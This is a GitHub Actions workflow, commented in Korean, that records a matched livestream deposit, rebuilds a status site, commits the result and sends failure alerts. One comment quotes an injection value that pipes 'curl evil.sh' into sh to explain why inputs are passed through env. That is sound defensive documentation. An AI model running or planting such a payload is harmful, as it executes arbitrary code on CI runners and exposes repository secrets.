name: Deposit (8마일 매칭 입금)

# 방송 중 폰에서 입금 등록: GitHub 앱/웹 → Actions → 이 워크플로 → Run workflow
# → 금액·메모 입력. 통합 계좌 원금이 늘고 사이트가 갱신되며 방송 화면에
# 배너가 뜬다(다음 폴링 주기).
#
# ⚠️ 법적 구조: 후원금 자체를 굴리는 것이 아니다 — 운영자가 같은 금액만큼
# '가상' 계좌 원금을 늘리는 매칭 이벤트다(대가·지분 없음).

on:
  workflow_dispatch:
    inputs:
      amount:
        description: "입금액(원) — 예: 10000"
        required: true
      memo:
        description: "메모 — 예: 슈퍼챗 ○○님"
        required: false
        default: ""

permissions:
  contents: write

jobs:
  deposit:
    runs-on: ubuntu-latest
    # 매달림 방어(2026-08-11 감사 77) — 무제한이면 배치가 멈춘 채
    # 몇 시간을 태우고 로그도 안 남는다. 값은 실측 최대의 3배 이상.
    timeout-minutes: 15
    defaults:
      run:
        shell: bash
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      # ⚠️ **이 단계가 아예 없었다**(2026-08-13). 입금이 이렇게 죽었다:
      #        python -m quant deposit --amount 920000 ...
      #        → ModuleNotFoundError: No module named 'numpy'
      #    입금 자체는 numpy가 필요 없어서 그쪽은 가벼운 모듈로 옮겼지만,
      #    바로 다음 줄의 `write_docs_status()`는 사이트 전체를 다시 만드는
      #    일이라 pandas·numpy가 진짜로 필요하다. 둘 다 고쳐야 끝난다.
      #    (감사 102와 같은 계열 — 의존성 설치 없는 워크플로가 무거운
      #     모듈을 부르는 것. 그때는 SNS 게시가 밤중에 죽었다.)
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt

      # ⚠️ 입력값은 반드시 env로 전달한다 — ${{ }}를 run: 안에 직접 쓰면
      #    GitHub가 셸보다 먼저 문자열을 갈아끼우므로, 메모에
      #        "; curl evil.sh | sh; #
      #    같은 값을 넣으면 러너에서 임의 명령이 실행된다(contents: write 권한과
      #    이 단계의 시크릿이 노출된다). 교과서적인 Actions 스크립트 인젝션이며
      #    2026-08-11 감사에서 발견했다. env 경유는 셸이 값을 '데이터'로만 본다.
      - name: 입금 등록 + 사이트 갱신
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
          QUANT_LIVE_URL: ${{ vars.QUANT_LIVE_URL }}
          DEPOSIT_AMOUNT: ${{ github.event.inputs.amount }}
          DEPOSIT_MEMO: ${{ github.event.inputs.memo }}
        run: |
          python -m quant deposit --amount "$DEPOSIT_AMOUNT" --memo "$DEPOSIT_MEMO"
          python -c "from quant.live.daily import write_docs_status; write_docs_status()"

      - name: 커밋
        env:
          DEPOSIT_AMOUNT: ${{ github.event.inputs.amount }}
          DEPOSIT_MEMO: ${{ github.event.inputs.memo }}
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add state/ docs/status.json
          git commit -m "매칭 입금: +${DEPOSIT_AMOUNT}원 (${DEPOSIT_MEMO}) [skip actions]"
          for i in 1 2 3 4; do
            git pull --rebase origin main && git push origin HEAD:main && exit 0
            sleep $((2**i))
          done
          echo "❌ 푸시 실패"; exit 1
      - name: 실패 경보 (디스코드/텔레그램)
        # 잡이 어느 단계에서 죽어도 폰으로 알린다 — 조용한 고장이 가장 위험하다.
        # 파이썬 의존성 없이 curl만 사용(의존성 설치 전에 죽어도 동작).
        if: failure()
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
        run: |
          MSG="🚨 [Quant] '${{ github.workflow }}' 실패 ($(date -u +%F)) — 로그: https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
          if [ -n "$DISCORD_WEBHOOK_URL" ]; then
            curl -s -H "Content-Type: application/json" \
              -d "{\"content\":\"$MSG\"}" "$DISCORD_WEBHOOK_URL" || true
          fi
          if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
            curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
              -d chat_id="$TELEGRAM_CHAT_ID" --data-urlencode text="$MSG" || true
          fi
          echo "경보 전송 시도 완료 (설정된 채널 없으면 무시)"
